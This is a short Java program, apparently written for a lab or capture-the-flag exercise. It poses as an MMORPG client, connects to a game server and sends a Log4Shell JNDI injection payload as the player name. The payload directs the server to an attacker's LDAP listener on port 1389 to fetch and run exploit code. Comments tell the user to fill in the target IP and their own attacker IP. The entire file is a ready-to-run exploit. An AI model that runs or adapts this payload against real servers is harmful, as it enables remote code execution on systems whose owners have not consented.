import java.io.*;
import java.net.*;

public class MMORPGClient {
    private static final String SERVER_IP   = "123.456.7.89"; // CHANGE THIS to the Server IP
    private static final int    SERVER_PORT = 12345;
    private static final String ATTACKER_IP = "10.0.101.78"; // YOUR IP from 'ip addr'

    public static void main(String[] args) {
        try (Socket socket = new Socket(SERVER_IP, SERVER_PORT);
             PrintWriter out = new PrintWriter(socket.getOutputStream(), true);
             BufferedReader in = new BufferedReader(new InputStreamReader(socket.getInputStream()))) {

            // Read the "Enter name" prompt
            System.out.println("Server: " + in.readLine());

            // The JNDI payload pointing to your LDAP listener
            String payload = "${jndi:ldap://" + ATTACKER_IP + ":1389/Exploit}";
            
            System.out.println("Sending Payload: " + payload);
            out.println(payload);

            // Keep alive to see if server responds
            Thread.sleep(2000);

        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}